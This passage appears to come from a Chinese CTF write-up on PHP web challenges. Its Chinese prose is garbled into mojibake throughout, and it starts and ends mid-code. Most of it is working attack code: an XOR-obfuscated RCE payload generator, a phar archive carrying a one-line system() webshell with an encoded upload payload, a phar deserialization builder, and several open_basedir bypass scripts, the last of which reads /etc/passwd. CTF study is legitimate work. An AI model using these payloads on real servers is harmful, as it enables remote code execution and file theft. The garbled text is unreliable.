variable">$hex_j</span><span class="token punctuation">;</span>            <span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">32</span><span class="token operator">&amp;</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$contents</span><span class="token operator">.</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># author yu22x</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> urllib<span class="token keyword">from</span> sys <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>   s1<span class="token operator">=</span><span class="token string">""</span>   s2<span class="token operator">=</span><span class="token string">""</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> arg<span class="token punctuation">:</span>       f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"xor_rce.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>       <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>           t<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token keyword">if</span> t<span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">:</span>               <span class="token keyword">break</span>           <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>i<span class="token punctuation">:</span>               <span class="token comment">#print(i)</span>               s1<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>               s2<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>               <span class="token keyword">break</span>       f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   output<span class="token operator">=</span><span class="token string">"(\""</span><span class="token operator">+</span>s1<span class="token operator">+</span><span class="token string">"\"^\""</span><span class="token operator">+</span>s2<span class="token operator">+</span><span class="token string">"\")"</span>   <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>   <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>   param<span class="token operator">=</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n[+] your functionï¼š"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your commandï¼š"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">";"</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>803</strong></p><h3 id="pharæ–‡ä»¶åŒ…å«"><a href="#pharæ–‡ä»¶åŒ…å«" class="headerlink" title="pharæ–‡ä»¶åŒ…å«"></a>pharæ–‡ä»¶åŒ…å«</h3><p>æ¥è‡ªå¤§ä½¬çš„æç¤ºï¼šæŠŠpharå½“å‹ç¼©åŒ…ç”¨å°±è¡Œ</p><p>é¦–å…ˆç”ŸæˆåŒ…å«ä¸€å¥è¯æœ¨é©¬çš„pharæ–‡ä»¶</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//åç¼€åå¿…é¡»ä¸ºphar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è®¾ç½®stub</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.txt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;?php system($_POST[a]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// pharç”Ÿæˆ</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ—¶pharåŒ…ä¸­çš„test.txtä¸­çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬äº†</p><p>ä¸Šä¼ æ–‡ä»¶ï¼ˆè®°å¾—è¯»å–ç„¶åurlç¼–ç ä¸€ä¸‹ï¼‰</p><pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;&#x2F;tmp&#x2F;phar.phar&amp;content&#x3D;%3C%3Fphp+__HALT_COMPILER%28%29%3B+%3F%3E%0D%0A6%00%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00%00%00%00%00%08%00%00%00test.txt%1A%00%00%00%7E%E7%9Db%1A%00%00%00%C8%C2%DA%2C%A4%01%00%00%00%00%00%00%3C%3Fphp+system%28%24_POST%5Ba%5D%29%3B%3F%3E%FB%C1%FC%A84J%19%C8f%97%29%BA%C7%80v%82%F5%86J%06%02%00%00%00GBMB<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>includeå¹²</p><p>![æˆªå±2022-06-06 20.00.48](/Users/jlan/Library/Application Support/typora-user-images/æˆªå±2022-06-06 20.00.48.png)</p><p><strong>804</strong></p><h3 id="pharååºåˆ—åŒ–"><a href="#pharååºåˆ—åŒ–" class="headerlink" title="pharååºåˆ—åŒ–"></a>pharååºåˆ—åŒ–</h3><p>è¿™ä¸ç”¨æ•™å§</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">hacker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// @unlink("phar.phar");</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//åç¼€åå¿…é¡»ä¸ºphar</span><span class="token comment">// $phar = $phar->convertToExecutable(Phar::TAR, Phar::GZ); //å‹ç¼©è§„é¿æ•æ„Ÿå­—ç¬¦</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è®¾ç½®stub</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-></span><span class="token property">code</span><span class="token operator">=</span><span class="token string double-quoted-string">"highlight_file('flag.php');"</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><span class="token comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// pharç”Ÿæˆ</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šä¼ pharåè®®è¯»å–å°±è¡Œ</p><p><strong>805</strong></p><h3 id="open-basedirç»•è¿‡"><a href="#open-basedirç»•è¿‡" class="headerlink" title="open_basedirç»•è¿‡"></a>open_basedirç»•è¿‡</h3><blockquote><p>open_basediræ˜¯php.iniä¸­çš„ä¸€ä¸ªé…ç½®é€‰é¡¹ï¼Œå¯ç”¨äºå°†ç”¨æˆ·è®¿é—®æ–‡ä»¶çš„æ´»åŠ¨èŒƒå›´é™åˆ¶åœ¨æŒ‡å®šçš„åŒºåŸŸã€‚</p><p>å‡è®¾open_basedir=/var/www/html/web1/:/tmp/ï¼Œé‚£ä¹ˆé€šè¿‡web1è®¿é—®æœåŠ¡å™¨çš„ç”¨æˆ·å°±æ— æ³•è·å–æœåŠ¡å™¨ä¸Šé™¤äº†/var/www/html/web1/å’Œ/tmp/è¿™ä¸¤ä¸ªç›®å½•ä»¥å¤–çš„æ–‡ä»¶ã€‚</p><p>æ³¨æ„ï¼šç”¨open_basediræŒ‡å®šçš„<strong>é™åˆ¶å®é™…ä¸Šæ˜¯å‰ç¼€ï¼Œè€Œä¸æ˜¯ç›®å½•å</strong>ã€‚</p><p>æ–‡ç« æ¥è‡ª<a href="https://www.cnblogs.com/hookjoy/p/12846164.html">è¿™é‡Œ</a></p></blockquote><p>ä½†æ˜¯è¿™ä¸ªé…ç½®å¯¹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæ˜¯æ²¡æœ‰æ•ˆæœçš„ï¼Œæ¯”å¦‚æ‰§è¡Œ<code>system(&#39;ls /&#39;)</code>çš„æ—¶å€™å°±ä¸å—é™åˆ¶ï¼Œ<del>ä½†æ˜¯ä¸€èˆ¬éƒ½ä¼šè¢«banæ‰</del></p><p>ä¸‹é¢å°±æ˜¯ä¸€äº›bypassæ–¹æ³•</p><ol><li><p>globåè®®ï¼Œåªèƒ½æææ–‡ä»¶å</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"glob:///*"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>åˆ©ç”¨chdir()ä¸ini_set()ç»„åˆBypass</p><p>åŸç†åœ¨è¿™é‡Œ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"s"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ctfshowflag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>åˆ©ç”¨bindtextdomain()å‡½æ•°Bypass</p><p>è¿™ä¸ªæ–¹æ³•ä¹Ÿåªèƒ½æææ–‡ä»¶å</p><blockquote><p><strong>bindtextdomain()å‡½æ•°</strong></p><p>(PHP 4, PHP 5, PHP 7)</p><p>bindtextdomain()å‡½æ•°ç”¨äºç»‘å®šdomainåˆ°æŸä¸ªç›®å½•çš„å‡½æ•°ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">bindtextdomain</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$domain</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$directory</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>bindtextdomain()å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°$directoryæ˜¯ä¸€ä¸ªæ–‡ä»¶è·¯å¾„ï¼Œå®ƒä¼šåœ¨$directoryå­˜åœ¨çš„æ—¶å€™è¿”å›$directoryï¼Œä¸å­˜åœ¨åˆ™è¿”å›falseã€‚</p></blockquote><p>æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹directoryå‚æ•°æ ¹æ®è¿”å›å€¼æ¥åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨</p></li><li><p>åˆ©ç”¨SplFileInfo::getRealPath()ç±»æ–¹æ³•Bypass</p><p>è¿™ä¸ªå’Œä¸Šé¢é‚£ä¸ªå¾ˆç›¸ä¼¼ï¼Œä¹Ÿæ˜¯åŸºäºæŠ¥é”™ï¼Œç›´æ¥ç»™payloadå§</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;b>open_basedir: '</span> <span class="token operator">.</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/b>&lt;br />'</span><span class="token punctuation">;</span><span class="token variable">$info</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SplFileInfo</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token operator">-></span><span class="token function">getRealPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>åˆ©ç”¨realpath()å‡½æ•°Bypass</p><blockquote><h3 id="realpath-å‡½æ•°"><a href="#realpath-å‡½æ•°" class="headerlink" title="realpath()å‡½æ•°"></a>realpath()å‡½æ•°</h3><p>(PHP 4, PHP 5, PHP 7)</p><p>realpath â€” è¿”å›è§„èŒƒåŒ–çš„ç»å¯¹è·¯å¾„åã€‚å®ƒå¯ä»¥å»æ‰å¤šä½™çš„../æˆ–./ç­‰è·³è½¬å­—ç¬¦ï¼Œèƒ½å°†ç›¸å¯¹è·¯å¾„è½¬æ¢æˆç»å¯¹è·¯å¾„ã€‚</p><p>å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">realpath</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$path</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>ç¯å¢ƒæ¡ä»¶ï¼šWindows</p><p>åŸºæœ¬åŸç†æ˜¯åŸºäºæŠ¥é”™è¿”å›å†…å®¹çš„ä¸ç”¨ï¼Œè®¾ç½®è‡ªå®šä¹‰çš„é”™è¯¯å¤„ç†å‡½æ•°ï¼Œå¾ªç¯éå†åŒ¹é…åˆ°æ­£åˆ™çš„æŠ¥é”™ä¿¡æ¯çš„å­—ç¬¦æ¥é€ä¸ªæ‹¼æ¥æˆå­˜åœ¨çš„æ–‡ä»¶åï¼Œå¦å¤–æ˜¯éœ€è¦ç»“åˆåˆ©ç”¨Windowsä¸‹çš„ä¸¤ä¸ªç‰¹æ®Šçš„é€šé…ç¬¦&lt;å’Œ&gt;ï¼Œä¸ç„¶åªèƒ½è¿›è¡Œæš´ç ´ã€‚</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;b>open_basedir: %s&lt;/b>&lt;br />"</span><span class="token punctuation">,</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">set_error_handler</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'isexists'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'E:/wamp64/'</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyz0123456789_'</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$dir</span> <span class="token operator">.</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;>&lt;'</span><span class="token punctuation">;</span>        <span class="token function">realpath</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">isexists</span><span class="token punctuation">(</span><span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/File\((.*)\) is not within/'</span><span class="token punctuation">;</span>        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$regexp</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%s &lt;br/>"</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œé¦–å­—æ¯ä¸åŒçš„æ–‡ä»¶å°±è¢«åˆ—å‡ºæ¥äº†ï¼Œé¦–å­—æ¯ç›¸åŒçš„æ–‡ä»¶ä¸­åªåˆ—äº†ç¬¬ä¸€ä¸ªï¼š</p><p><img src="https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/10.png"></p></li></ol><p>æœ€åæ˜¯å¤§ä½¬è„šæœ¬</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** by phithon* From https://www.leavesongs.com* detail: http://cxsecurity.com/issue/WLB-2009110068*/</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'content-type: text/plain'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir: %s\nphp_version: %s\n"</span><span class="token punctuation">,</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">phpversion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"disable_functions: %s\n"</span><span class="token punctuation">,</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'disable_functions'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$relat_file</span> <span class="token operator">=</span> <span class="token function">getRelativePath</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$paths</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">999</span><span class="token punctuation">;</span><span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token function">getRandStr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$paths</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$paths</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$paths</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$paths</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token 